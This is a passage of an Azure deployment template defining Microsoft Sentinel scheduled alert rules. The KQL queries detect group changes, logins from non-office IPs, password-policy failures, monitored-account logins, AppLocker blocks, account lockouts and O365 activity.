e.bv_src_user and isnotempty(e.bv_src_user), 1, 0)\n  | extend bv_src_user_sid_excluded = iff(bv_src_user_sid contains e.bv_src_user_sid and isnotempty(e.bv_src_user_sid), 1, 0)\n  | extend bv_group_excluded = iff(bv_group contains e.bv_group and isnotempty(e.bv_group), 1, 0)\n  | extend bv_group_sid_excluded = iff(bv_group_sid contains e.bv_group_sid and isnotempty(e.bv_group_sid), 1, 0)\n  | extend excluded_count = \n          bv_src_user_excluded\n          + bv_src_user_sid_excluded\n          + bv_group_excluded\n          + bv_group_sid_excluded\n  | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n  | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n  | summarize excluded=make_set(excluded), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n)\n| extend ExcludedEvent = iff(excluded contains 'true', true, false)\n| where not(ExcludedEvent)\n| summarize\n    bv_start_time=min(TimeGenerated)\n    , bv_end_time=max(TimeGenerated)\n    , bv_event_count=count()\n    , bv_group = make_set(bv_group, 10)\n    , bv_group_sid = make_set(bv_group_sid, 10)\n    , bv_activity = make_set(bv_activity, 5)\n    , bv_dest_user = make_set_if(bv_dest_user, isnotempty(bv_dest_user), 10)\n    , bv_dest_user_sid = make_set_if(bv_dest_user_sid, isnotempty(bv_dest_user_sid), 10)\n    , bv_object = make_set_if(bv_object, isnotempty(bv_object), 10)\n    , bv_dest_dvc = make_set(bv_dest_dvc, 10)\n  by \n    bv_src_user\n    , bv_src_user_sid\n| extend AttackerEntity = array_concat(pack_array(bv_src_user), pack_array(bv_src_user_sid))\n| extend VictimEntity = array_concat(bv_dest_user, bv_dest_user_sid)\n| extend ExtendedDescription = strcat(\n    'bv_src_user: ', bv_src_user\n    ,'\\nbv_dest_user: \\n* ', strcat_array(array_slice(bv_dest_user,0,10), '\\n* ')\n    ,'\\nbv_event_count: ', bv_event_count\n    ,'\\nbv_group: \\n* ', strcat_array(array_slice(bv_group,0,5), '\\n* ')\n    ,'\\nbv_group_sid: \\n* ', strcat_array(array_slice(bv_group_sid,0,5), '\\n* ')\n    ,'\\nbv_activity: \\n* ', strcat_array(array_slice(bv_activity,0,5), '\\n* ')\n    ,'\\nbv_object: \\n* ', strcat_array(array_slice(bv_object,0,5), '\\n* ')\n    ,'\\nbv_dest_dvc: \\n* ', strcat_array(array_slice(bv_dest_dvc,0,5), '\\n* ')\n)\n| project\n    bv_start_time\n    , bv_end_time\n    , bv_src_user\n    , bv_src_user_sid\n    , bv_event_count\n    , bv_group\n    , bv_group_sid\n    , bv_activity\n    , bv_dest_user\n    , bv_dest_user_sid\n    , bv_object\n    , bv_dest_dvc\n    , AttackerEntity\n    , VictimEntity\n    , ExtendedDescription\n    , RBAScore = 1",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT30M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "DefenseEvasion",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1098",
            "T1484"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Generates an alert when there are security-enabled monitored group changes over an observed period of time.\n\n{{ExtendedDescription}}\n\nMITRE: T1098 MITRE: T1484\nCategory: Windows Security\ntag: Custom"
          },
          "customDetails": {
            "RBAScore": "RBAScore",
            "AttackerEntity": "AttackerEntity",
            "VictimEntity": "VictimEntity"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-10532')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-10532')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-10532: [Custom] Azure AD Login from Non Office IP",
          "description": "Identifies logins from an IP address not previously excluded\n\nExclusions: \n      * bv_dest_app\n      * bv_src_ip\n      * bv_src_country\n      * bv_src_state\n      * bv_dest_user MITRE: T1078 Category: Azure AD tag: Custom",
          "severity": "Low",
          "enabled": false,
          "query": "let latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\nSigninLogs\n| where TimeGenerated between (ago(start_time +latency) .. now()) and ingestion_time() > ago(start_time)\n| where array_length(BV10532_TRUSTED_IPS) > 0\n| where ResultType == 0\n| where IPAddress !in (BV10532_TRUSTED_IPS)\n| extend\n    bv_start_time = TimeGenerated\n    , bv_dest_app = AppDisplayName\n    , bv_src_ip = IPAddress\n    , bv_src_country = tostring(LocationDetails.countryOrRegion)\n    , bv_src_state = tostring(LocationDetails.state)\n    , bv_src_city = tostring(LocationDetails.city)\n    , bv_dest_user = UserPrincipalName\n    , bv_http_user_agent = UserAgent\n// ************************************************************************* \n//       <Exclusions>\n// *************************************************************************\n| mv-apply e = BV10532_EXCLUSIONS on (\n    extend keys = bag_keys(e) \n    | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n    | extend bv_dest_app_excluded = iff(bv_dest_app contains e.bv_dest_app, true, false)\n    | extend bv_src_ip_excluded = iff(bv_src_ip contains e.bv_src_ip, true,false)\n    | extend bv_src_country_excluded = iff(bv_src_country contains e.bv_src_country, true,false)\n    | extend bv_src_state_excluded = iff(bv_src_state contains e.bv_src_state, true,false)\n    | extend bv_dest_user_excluded = iff(bv_dest_user contains e.bv_dest_user, true,false)\n    | extend excluded_count = \n            iff(bv_dest_app_excluded and isnotempty(e.bv_dest_app), 1,0)\n            + iff(bv_src_ip_excluded and isnotempty(e.bv_src_ip), 1,0)\n            + iff(bv_src_country_excluded and isnotempty(e.bv_src_country), 1,0)\n            + iff(bv_src_state_excluded and isnotempty(e.bv_src_state), 1,0)\n            + iff(bv_dest_user_excluded and isnotempty(e.bv_dest_user), 1,0)\n    | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n    | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n    | summarize excluded=make_set(excluded), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n)\n| extend ExcludedEvent = iff(excluded contains 'true', true, false)\n// ************************************************************************* \n//       </Exclusions>\n// *************************************************************************\n| where not(ExcludedEvent)\n| extend VictimEntity = pack_array(bv_dest_user)\n| extend AttackerEntity = pack_array(bv_src_ip)\n| extend RBAScore = 1\n| extend ExtendedDescription = strcat(\n        'bv_dest_user: ', bv_dest_user\n        , '\\nbv_src_ip: ', bv_src_ip\n        , '\\nbv_src_country: ', bv_src_country\n        , '\\nbv_src_city: ', bv_src_city\n        , '\\nbv_http_user_agent: ', bv_http_user_agent\n    )\n| project \n    bv_start_time\n    , bv_src_city\n    , bv_src_country\n    , bv_dest_app\n    , bv_src_ip\n    , bv_dest_user\n    , bv_http_user_agent\n    , bv_auth_result = 'success'\n    , bv_authentication_protocl = 'http'\n    , ExtendedDescription\n    , RBAScore\n    , VictimEntity\n    , AttackerEntity",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Identifies logins from an IP address not previously excluded\n\nExclusions: \n    * bv_file_name\n    * bv_dest_dvc_hostname\n    * bv_file_hash\n    * bv_signature\n    * bv_dest_ip\n    * bv_dest_user\n\n{{ExtendedDescription}}\n\nMITRE: T1078\nCategory: Azure AD\ntag: Custom"
          },
          "customDetails": {
            "RBAScore": "RBAScore",
            "AttackerEntity": "AttackerEntity",
            "VictimEntity": "VictimEntity"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_dest_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-2510')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-2510')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-2510: [Custom] Windows - Audit Only Password Validation Failure",
          "description": "An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords.\n\nThis rule will monitor for allowed password validation events that would have failed due to password polices.\n\nInclusions: None \nExclusions: None \n\nConsiderations: \n  1. Review associated events for user\n  2. Review policy exceptions MITRE: T1110 Category: Windows Events tag: Custom",
          "severity": "Medium",
          "enabled": false,
          "query": "let start_time = 30m;\nlet latency = 30m;\nlet EventIDList = dynamic([30028,30029,30023,3009,30010]);  \nEvent\n| where TimeGenerated between (ago(start_time +latency) .. now()) and ingestion_time() > ago(start_time)\n| where EventLog == @'Microsoft-AzureADPasswordProtection-DCAgent/Admin'\n| where EventID in (EventIDList)\n| parse RenderedDescription with * 'UserName: ' UserName ' Fullname: ' FullName\n| extend ExtendedDescription=RenderedDescription\n| extend VictimEntity = pack_array(UserName)\n| project TimeGenerated, UserName, FullName, EventID, ExtendedDescription, VictimEntity",
          "queryFrequency": "PT30M",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords.\n\nThis rule will monitor for allowed password validation events that would have failed due to password polices.\n\nInclusions: None \nExclusions: None \n\nConsiderations: \n  1. Review associated events for user\n  2. Review policy exceptions\n\n{{ExtendedDescription}}\n\nMITRE: T1110\nCategory: Windows Events\ntag: Custom"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-2601')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-2601')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-2601: [Custom] Windows - Successful Interactive Login for Monitored Account",
          "description": "This alert identifies successful logins using a monitored account. MITRE: T1098 Category: Windows Security tag: Custom",
          "severity": "Informational",
          "enabled": false,
          "query": "let EventIDList = dynamic(['4624']);    \nlet latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\nlet alert_bin = 15m;\nSecurityEvent\n|where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n|where EventID in (EventIDList)\n| where AccountType =~ 'User' \n| where LogonTypeName contains 'Interactive' or LogonTypeName contains 'Remote Desktop' or LogonTypeName contains 'Cached_Interactive'\n| where tolower(TargetUserName) matches regex tolower(A2601_MONITORED_USERS)\n| extend TargetUserName = tolower(TargetUserName)\n| summarize\n    Count=count()\n    , Computers=make_set(Computer, 5)\n    , ComputerCount=dcount(Computer)\n    , TimeGenerated=min(TimeGenerated)\n    , LogonTypeName=make_set(LogonTypeName, 5)\n    , WorkstationName=make_set(WorkstationName, 5)\n    by TargetUserName, bin_at(TimeGenerated, alert_bin, now())\n| extend VictimEntity = TargetUserName\n| extend ExtendedDescription = strcat('Monitored user account ', TargetUserName, ' performed an interactive login on system ', WorkstationName)\n| project TimeGenerated\n, TargetUserName\n, Count\n, Computers\n, ComputerCount\n, WorkstationName\n, VictimEntity\n, ExtendedDescription",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies successful logins using a monitored account.\n{{ExtendedDescription}}\ntag: Custom\nCategory: Windows Security\nMITRE: T1098                 "
          },
          "customDetails": {
            "VictimEntity": "VictimEntity"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "TargetUserName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-880')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-880')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-880: [Custom] Windows - An Executable Prevented From Running By AppLocker",
          "description": "This alerts when a user runs an executable that is blocked by Applocker. MITRE: T1059,T1559 Category: Windows Security tag: Custom",
          "severity": "Medium",
          "enabled": false,
          "query": "let start_time = 1h;\nlet start_time_historical = 7d;\nlet id_user = SecurityEvent\n    | where TimeGenerated between (ago(start_time_historical) .. now())\n    | where EventID in (4624, 4688)\n    | where isnotempty(SubjectUserName)\n    | summarize by SubjectUserSid, SubjectAccount, SubjectUserName\n;\nlet id_user2 = SigninLogs\n    | where TimeGenerated between (ago(start_time_historical) .. now())\n    | parse UserPrincipalName with SubjectUserName '@' UserDomain\n    | where isnotempty(SubjectUserName)\n    | summarize by Identity, SubjectUserName, MailAddress = UserPrincipalName\n;\nlet emptydatatable = datatable(AccountSID:string, AccountUPN:string, GivenName:string, Surname:string, MailAddress:string, AccountName:string)[];\nlet Identities =  union isfuzzy=true emptydatatable, (IdentityInfo | where TimeGenerated > ago(7d) | summarize by AccountSID, AccountUPN, GivenName, Surname, MailAddress, AccountName);\nSecurityEvent\n| where TimeGenerated between (ago(start_time) .. now())\n| where EventID == 8004\n| where EventSourceName =~ \"Microsoft-Windows-AppLocker\" or Channel contains 'AppLocker'\n| extend TargetUser_ = tostring(parse_json(EventData).TargetUser)\n| extend SubjectUserSid = coalesce(TargetUser_,TargetUser)\n| extend SubjectUserSid = trim(' ', SubjectUserSid)\n| join kind=leftouter (id_user) on SubjectUserSid\n| extend FilePath_ = tostring(parse_json(EventData).FilePath)\n| extend FilePath = coalesce(FilePath, FilePath_)\n| where FilePath matches regex (A880_EXCLUSION_FILE_PATH_REGEX) == false\n| extend FileName = tostring(parse_path(FilePath).Filename)\n| summarize\n    TimeGenerated=min(TimeGenerated)\n    , EventCount = count()\n    by\n    SubjectUserName = tolower(SubjectUserName1),\n    SubjectUserSid,\n    FilePath,\n    SubjectAccount = tolower(SubjectAccount1),\n    Computer,\n    FileName\n| join kind=leftouter (id_user2) on SubjectUserName\n| parse Identity with GivenName ' ' SurName\n| extend ExtendedDescription = strcat('The executable ', FileName, ' was blocked by AppLocker on host ', Computer, ' that was used by ', SubjectUserName, '.')\n| lookup kind=leftouter (Identities)  on $left.SubjectUserSid == $right.AccountSID\n| extend GivenName = GivenName1,\n        MailAddress = MailAddress1,\n        SurName = Surname,\n        SubjectAccount = AccountName,\n        SubjectUserName = AccountUPN\n| extend AttackerEntity = array_concat(pack_array(SubjectUserName), todynamic(Computer))\n| extend RBAScore = iff(EventCount > 5, 3, 1)\n| extend bv_rule_version = '1.0.4522'\n| extend bv_rule_timestamp = '1701351973.3785415'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.4522 bv_rule_timestamp: 1701351973.3785415'\n| project\n    SubjectUserName\n    , SubjectUserSid\n    , FilePath\n    , SubjectAccount\n    , Computer\n    , FileName\n    , TimeGenerated\n    , EventCount\n    , MailAddress\n    , Identity\n    , GivenName\n    , SurName\n    , ExtendedDescription\n    , AttackerEntity\n    , RBAScore\n    , bv_rule_combined_string",
          "queryFrequency": "PT1H",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [
            "T1059",
            "T1559"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-880: [Custom] Windows - An Executable Prevented From Running By AppLocker - {{FileName}}",
            "alertDescriptionFormat": "{{ExtendedDescription}}\n\nRecommendations: \n  1. Review associated behavior for the host and user.\n\nCategory: Windows Security\ntag: Custom\nMITRE: T1059\nMITRE: T1559     \n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-10559')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-10559')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-10559: [Custom] Windows - Number Of Locked Accounts Over Threshold",
          "description": "Generates an alert when there are multiple locked accounts over a specific threshold daily. MITRE: T1531,T1110 Category: Windows Security tag: Custom",
          "severity": "Low",
          "enabled": false,
          "query": "let EventIDList = dynamic([4740]);    \nlet start_time = 1d;\nlet end_time = now();\nlet latency = 0d;\nlet alert_bin = 1d;\nSecurityEvent\n| where TimeGenerated between (ago(latency + start_time).. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| summarize bv_event_count = count(), bv_start_time = min(TimeGenerated), bv_end_time = max(TimeGenerated), bv_dest_user = make_set(Account, 100), bv_dest_user_count = dcount(Account) by bv_src_user = SubjectUserName, bin_at(TimeGenerated, alert_bin, end_time)\n| where bv_event_count >= BV10559_THRESHOLD\n| extend VictimEntity = bv_dest_user\n| extend AttackerEntity = pack_array(bv_src_user)\n| extend ExtendedDescription = strcat('At least ', bv_dest_user_count, ' locked accounts have been observed.')          \n| project\n    TimeGenerated\n    , bv_start_time\n    , bv_end_time\n    , bv_dest_user\n    , bv_dest_user_count\n    , bv_src_user\n    , bv_event_count\n    , AttackerEntity\n    , VictimEntity\n    , RBAScore = 1\n    , ExtendedDescription          ",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact",
            "CredentialAccess"
          ],
          "techniques": [
            "T1531",
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Generates an alert when there are multiple locked accounts over a specific threshold daily.\n\n{{ExtendedDescription}}\n\nMITRE: T1531 MITRE: T1110\nCategory: Windows Security\ntag: Custom"
          },
          "customDetails": {
            "RBAScore": "RBAScore",
            "AttackerEntity": "AttackerEntity",
            "VictimEntity": "VictimEntity"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11080')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11080')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11080: [Custom] O365 - Monitored Activity By Unauthorized Users",
          "description": "This alert identifies suspicious activities done by unauthorized users via Office 365 logs MITRE: T1078,T1114 Category: Office 365 tag: Custom",
          "severity": "Low",
          "enabled": false,
          "query": "let start_time = 1h;\nlet latency = 0m;\nlet alert_bin = 1h;\nlet end_time = now();\nlet exclusion_fields = datatable (\n  bv_src_user:string\n  , bv_src_ip:string\n  , bv_change_action: string\n  , bv_object: string\n)[];\nlet exclusions = ( T:(\n  bv_src_user:string\n  , bv_src_ip:string\n  , bv_change_action: string\n  , bv_object: string\n  )\n  , Exclusion: dynamic) {\n  T\n    | mv-apply e = Exclusion on (\n        extend keys = bag_keys(e)\n        | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n        | extend bv_src_user_array = split(e.bv_src_user, ',')\n        | extend bv_change_action_array = split(e.bv_change_action, ',')\n        | extend bv_object_array = split(e.bv_object, ',')        \n        | mv-apply f = bv_src_user_array on ( \n          extend bv_src_user_excluded = iff(tolower(bv_src_user) contains tolower(f) and isnotempty(f), true, false)\n          | summarize bv_src_user_excluded = countif(bv_src_user_excluded)\n          | extend bv_src_user_excluded = iff(bv_src_user_excluded > 0 , 1, 0)\n        )\n        | mv-apply f = bv_change_action_array on ( \n          extend bv_change_action_excluded = iff(tolower(bv_change_action) contains tolower(f) and isnotempty(f), true, false)\n          | summarize bv_change_action_excluded = countif(bv_change_action_excluded)\n          | extend bv_change_action_excluded = iff(bv_change_action_excluded > 0, 1, 0)\n        )\n        | mv-apply f = bv_object_array on ( \n          extend bv_object_excluded = iff(tolower(bv_object) contains tolower(f) and isnotempty(f), true, false)\n          | summarize bv_object_excluded = countif(bv_object_excluded)\n          | extend bv_object_excluded = iff(bv_object_excluded > 0, 1, 0)\n        )        \n          | extend bv_src_ip_excluded = iff(bv_src_ip contains e.bv_src_ip and isnotempty(e.bv_src_ip), 1, 0)\n          | extend excluded_count = \n                        bv_src_user_excluded\n                        + bv_change_action_excluded\n                        + bv_src_ip_excluded\n                        + bv_object_excluded\n          | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n          | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n          | summarize excluded=make_set(excluded), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n    )\n    | extend ExcludedEvent = iff(excluded contains 'true', true, false)\n    | project-away excluded\n};      \nOfficeActivity\n|where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where OfficeWorkload !in~ ('SharePoint', 'OneDrive', 'MicrosoftTeams')\n| where tolower(Operation) matches regex @\"^set.*|^remove.*|^new.*|site|permission|inherit|migration|inherit|license|add\\sdevice|^get.*|group|principal|link|connector|disable\"\n| extend \n    bv_src_user = tolower(UserId)\n    , bv_dest_user = tolower(MailboxOwnerUPN)\n    , bv_affected_item = tostring(parse_json(tostring(parse_json(AffectedItems)[0].ParentFolder)).Path)\n    , bv_change_action = tolower(Operation)\n    , bv_object = OfficeObjectId\n    , bv_src_ip = ClientIP\n| union exclusion_fields | invoke exclusions(BV11080_CONFIGURATION['EXCLUSION'])\n| where not(ExcludedEvent)\n| summarize \n      bv_start_time = min(TimeGenerated)\n      , bv_end_time   = max(TimeGenerated)\n      , bv_event_count = count()\n      , bv_affected_item = make_set(bv_affected_item)\n      , bv_change_action = make_set(bv_change_action)\n      , bv_src_ip = make_set(bv_src_ip)\n      , bv_object = make_set(bv_object)\n    by \n      bv_src_user\n| extend VictimEntity = pack_array(bv_src_user)\n| extend AttackerEntity = pack_array(bv_src_user)\n| extend ExtendedDescription = strcat(\n      'bv_src_user:', bv_src_user\n      , '\\nbv_change_action: \\n* ', strcat_array(bv_change_action, '\\n* ')            \n      , '\\nbv_object: \\n* ', strcat_array(bv_object, '\\n* ')\n      , '\\nbv_src_ip: \\n* ', strcat_array(bv_src_ip, '\\n* ')                             \n      , '\\n\\nbv_affected_item: \\n* ', strcat_array(bv_affected_item, '\\n* ')\n)\n| project   \n      bv_start_time\n      , bv_end_time\n      , bv_src_user\n      , bv_event_count\n      , bv_change_action\n      , bv_object\n      , bv_src_ip\n      , bv_affected_item\n      , ExtendedDescription\n      , VictimEntity\n      , AttackerEntity\n      , RBAScore = BV11080_CONFIGURATION['RBASCORE']",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess",
            "Collection"
          ],
          "techniques": [
            "T1078",
            "T1114"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies suspicious activities done by unauthorized users via Office 365 logs\n\n{{ExtendedDescription}}\n\ntag: Custom\nCategory: Office 365"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11090')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11090')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11090: [Custom] O365 - Teams Recorded Session",
          "description": "This alert identifies any recorded meetings by users via Office 365 logs MITRE: T1125 Category: Office 365 tag: Custom",
          "severity": "Low",
          "enabled": false,
